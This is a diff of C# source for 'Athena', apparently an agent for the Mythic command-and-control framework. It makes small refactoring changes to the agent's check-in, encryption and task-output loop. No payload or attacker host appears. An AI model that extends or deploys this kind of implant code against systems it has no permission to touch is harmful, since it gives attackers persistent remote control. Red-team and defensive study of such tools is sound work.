@@ -1,5 +1,4 @@
 ﻿using Athena.Commands;
-using Athena.Config;
 using Athena.Mythic.Model.Checkin;
 using Athena.Mythic.Model;
 using Athena.Utilities;
@@ -13,7 +12,7 @@ namespace Athena
     class Program
     {
         static void Main(string[] args)
-        {
+       {
             int maxMissedCheckins = 5;
             int missedCheckins = 0;
             bool exit = false;
@@ -48,7 +47,7 @@ namespace Athena
 
             //Update our agent information with the response from the server.
             Globals.mc.MythicConfig.uuid = res.id;
-            if (Globals.encrypted)
+            if (Globals.mc.MythicConfig.currentConfig.encrypted)
             {
                 if(Globals.mc.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
                 {
@@ -111,11 +110,14 @@ namespace Athena
                         }
                     }
                     //Return output if server is accessible
-                    if (hasoutput.Count > 0)
+                    if (hasoutput.Count > 0 || Globals.bagOut.Count > 0)
                     {
                         //Did the POST send properly?
+                        //Should I return the object and handle all the parsing shit out here?
                         if (Globals.mc.SendResponse(hasoutput))
                         {
+                            //Clear out delegates array
+                            //Globals.delegateMessages.Clear();
                             //Remove sent commands from the Global job Dictionary or clear out taskresult of long running tasks
                             foreach (var job in hasoutput.Values)
                             {
@@ -135,6 +137,10 @@ namespace Athena
                                     }
                                 }
                             }
+                        }
+                        else
+                        {
+                            Console.WriteLine("False");
                         }
                     }
                     //Get sleep and go
